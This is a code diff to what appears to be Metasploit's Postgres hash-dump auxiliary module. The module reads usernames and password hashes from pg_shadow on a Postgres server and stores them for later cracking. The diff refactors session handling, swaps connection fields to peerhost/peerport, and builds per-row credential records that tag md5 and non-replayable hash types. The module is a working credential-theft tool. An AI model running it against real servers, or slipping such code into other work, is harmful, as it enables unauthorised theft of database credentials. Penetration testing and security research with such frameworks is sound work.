@@ -7,7 +7,7 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Postgres
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
-  include Msf::OptionalSession
+  include Msf::OptionalSession::PostgreSQL
 
   def initialize
     super(
@@ -17,8 +17,7 @@ class MetasploitModule < Msf::Auxiliary
         hashes from a Postgres server and stores them for later cracking.
       },
       'Author'         => ['theLightCosine'],
-      'License'        => MSF_LICENSE,
-      'SessionTypes'   => %w[PostgreSQL]
+      'License'        => MSF_LICENSE
     )
     deregister_options('SQL', 'RETURN_ROWSET', 'VERBOSE')
 
@@ -43,8 +42,8 @@ class MetasploitModule < Msf::Auxiliary
     res = postgres_query('SELECT usename, passwd FROM pg_shadow',false)
 
     service_data = {
-        address: postgres_conn.address,
-        port: postgres_conn.port,
+        address: postgres_conn.peerhost,
+        port: postgres_conn.peerport,
         service_name: 'postgres',
         protocol: 'tcp',
         workspace_id: myworkspace_id
@@ -80,10 +79,10 @@ class MetasploitModule < Msf::Auxiliary
 
       case res[:sql_error]
       when /^C42501/
-        print_error "#{postgres_conn.address}:#{postgres_conn.port} Postgres - Insufficient permissions."
+        print_error "#{postgres_conn.peerhost}:#{postgres_conn.peerport} Postgres - Insufficient permissions."
         return
       else
-        print_error "#{postgres_conn.address}:#{postgres_conn.port} Postgres - #{res[:sql_error]}"
+        print_error "#{postgres_conn.peerhost}:#{postgres_conn.peerport} Postgres - #{res[:sql_error]}"
         return
       end
     when :complete
@@ -108,30 +107,34 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     service_data = {
-        address: postgres_conn.address,
-        port: postgres_conn.port,
+        address: postgres_conn.peerhost,
+        port: postgres_conn.peerport,
         service_name: 'postgres',
         protocol: 'tcp',
         workspace_id: myworkspace_id
     }
 
-    credential_data = {
-        origin_type: :service,
-        jtr_format: 'raw-md5,postgres',
-        module_fullname: self.fullname,
-        private_type: :postgres_md5
-    }
-
-    credential_data.merge!(service_data)
-
-
     res[:complete].rows.each do |row|
       next if row[0].nil? or row[1].nil?
       next if row[0].empty? or row[1].empty?
+
       password = row[1]
 
-      credential_data[:username]     = row[0]
-      credential_data[:private_data] = password
+      credential_data = {
+        origin_type: :service,
+        module_fullname: self.fullname,
+        private_data: password,
+        username: row[0]
+      }
+
+      if password.start_with?('md5')
+        credential_data[:private_type] = :postgres_md5
+        credential_data[:jtr_format] = 'raw-md5,postgres'
+      else
+        credential_data[:private_type] = :nonreplayable_hash
+      end
+
+      credential_data.merge!(service_data)
 
       credential_core = create_credential(credential_data)
       login_data = {
